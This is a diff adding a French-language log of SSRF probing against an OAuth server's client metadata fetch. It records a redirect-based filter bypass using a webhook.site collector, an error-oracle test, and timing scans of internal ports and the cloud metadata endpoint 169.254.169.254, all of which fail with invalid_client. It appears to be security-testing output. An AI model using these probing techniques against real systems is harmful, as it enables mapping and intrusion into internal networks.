@@ -1,0 +1,67 @@
+=== 1) L AS SUIT-IL LES REDIRECTIONS ? (contournement du filtre SSRF) ===
+  client_id = redirecteur (httpbingo) -> webhook   1013ms  invalid_client
+  [apres authorize via redirecteur] 13 requete(s) sur le webhook :
+      GET https://webhook.site/3ef992c0-b173-407f-ab55-e3ea613a534a/cimd-clean-1792506647542 | UA: BugSecure-OAuth/1 (+client-id-metadata-document)
+      GET https://webhook.site/3ef992c0-b173-407f-ab55-e3ea613a534a/cimd-client | UA: BugSecure-OAuth/1 (+client-id-metadata-document)
+      GET https://webhook.site/3ef992c0-b173-407f-ab55-e3ea613a534a | UA: BugSecure-OAuth/1 (+client-id-metadata-document)
+      GET https://webhook.site/3ef992c0-b173-407f-ab55-e3ea613a534a | UA: node
+      GET https://webhook.site/3ef992c0-b173-407f-ab55-e3ea613a534a | UA: node
+  => l AS a suivi la redirection ? NON
+
+=== 2) ORACLE DE CONTENU : la description d erreur distingue-t-elle les contenus ? ===
+  texte non JSON                                    801ms  invalid_client
+  JSON vide                                         563ms  invalid_client
+  JSON sans client_id                               533ms  invalid_client
+  JSON client_id different                          610ms  invalid_client
+  JSON sans redirect_uris                          5707ms  invalid_client
+  JSON valide                                       749ms  invalid_client
+
+=== 3) PORTEE INTERNE : minimum de N echantillons (le min retire le bruit) ===
+  temoin externe (webhook) [1]                      237ms  invalid_client
+  temoin externe (webhook) [2]                      256ms  invalid_client
+  temoin externe (webhook) [3]                      260ms  invalid_client
+  temoin externe (webhook) [4]                      288ms  invalid_client
+  temoin externe (webhook) [5]                      277ms  invalid_client
+   temoin externe (webhook)            min=  237ms median=  260ms  [237,256,260,277,288]
+  127.0.0.1:3000 (app web) [1]                      137ms  invalid_client
+  127.0.0.1:3000 (app web) [2]                     1724ms  invalid_client
+  127.0.0.1:3000 (app web) [3]                      183ms  invalid_client
+  127.0.0.1:3000 (app web) [4]                     2040ms  invalid_client
+  127.0.0.1:3000 (app web) [5]                     1844ms  invalid_client
+   127.0.0.1:3000 (app web)            min=  137ms median= 1724ms  [137,183,1724,1844,2040]
+  127.0.0.1:9200 (ES?) [1]                          430ms  invalid_client
+  127.0.0.1:9200 (ES?) [2]                         1801ms  invalid_client
+  127.0.0.1:9200 (ES?) [3]                          662ms  invalid_client
+  127.0.0.1:9200 (ES?) [4]                          181ms  invalid_client
+  127.0.0.1:9200 (ES?) [5]                          169ms  invalid_client
+   127.0.0.1:9200 (ES?)                min=  169ms median=  430ms  [169,181,430,662,1801]
+  127.0.0.1:11211 (memcached?) [1]                  179ms  invalid_client
+  127.0.0.1:11211 (memcached?) [2]                  137ms  invalid_client
+  127.0.0.1:11211 (memcached?) [3]                  150ms  invalid_client
+  127.0.0.1:11211 (memcached?) [4]                  170ms  invalid_client
+  127.0.0.1:11211 (memcached?) [5]                  406ms  invalid_client
+   127.0.0.1:11211 (memcached?)        min=  137ms median=  170ms  [137,150,170,179,406]
+  127.0.0.1:80 [1]                                  146ms  invalid_client
+  127.0.0.1:80 [2]                                  257ms  invalid_client
+  127.0.0.1:80 [3]                                  132ms  invalid_client
+  127.0.0.1:80 [4]                                  387ms  invalid_client
+  127.0.0.1:80 [5]                                  153ms  invalid_client
+   127.0.0.1:80                        min=  132ms median=  153ms  [132,146,153,257,387]
+  192.0.2.1 (non routable, temoin) [1]              187ms  invalid_client
+  192.0.2.1 (non routable, temoin) [2]              127ms  invalid_client
+  192.0.2.1 (non routable, temoin) [3]             1751ms  invalid_client
+  192.0.2.1 (non routable, temoin) [4]              136ms  invalid_client
+  192.0.2.1 (non routable, temoin) [5]              134ms  invalid_client
+   192.0.2.1 (non routable, temoin)    min=  127ms median=  136ms  [127,134,136,187,1751]
+  10.0.0.1 (prive, temoin) [1]                      129ms  invalid_client
+  10.0.0.1 (prive, temoin) [2]                      281ms  invalid_client
+  10.0.0.1 (prive, temoin) [3]                      127ms  invalid_client
+  10.0.0.1 (prive, temoin) [4]                      128ms  invalid_client
+  10.0.0.1 (prive, temoin) [5]                      147ms  invalid_client
+   10.0.0.1 (prive, temoin)            min=  127ms median=  129ms  [127,128,129,147,281]
+  169.254.169.254 (IMDS) [1]                        136ms  invalid_client
+  169.254.169.254 (IMDS) [2]                        131ms  invalid_client
+  169.254.169.254 (IMDS) [3]                        128ms  invalid_client
+  169.254.169.254 (IMDS) [4]                        125ms  invalid_client
+  169.254.169.254 (IMDS) [5]                        133ms  invalid_client
+   169.254.169.254 (IMDS)              min=  125ms median=  131ms  [125,128,131,133,136]
